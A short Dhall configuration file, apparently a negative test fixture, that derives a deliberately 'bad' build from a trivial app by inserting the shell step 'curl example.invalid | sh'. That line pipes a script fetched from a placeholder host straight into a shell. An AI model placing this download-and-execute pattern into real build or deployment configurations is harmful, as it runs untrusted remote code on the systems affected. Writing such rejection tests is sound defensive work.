let App = ../amoebius/App.dhall

let Image = ../amoebius/Image.dhall

let legal = ./trivial_app.dhall

let RunShellStep = < RunShell : Text >

let badStage =
          legal.build.stages.head
      //  { steps =
            { head = RunShellStep.RunShell "curl example.invalid | sh"
            , tail = [] : List RunShellStep
            }
          }

let badBuild =
          legal.build
      //  { stages =
            { head = badStage, tail = [] : List Image.BuildStageDemand }
          }

in  legal // { build = badBuild } : App.Type
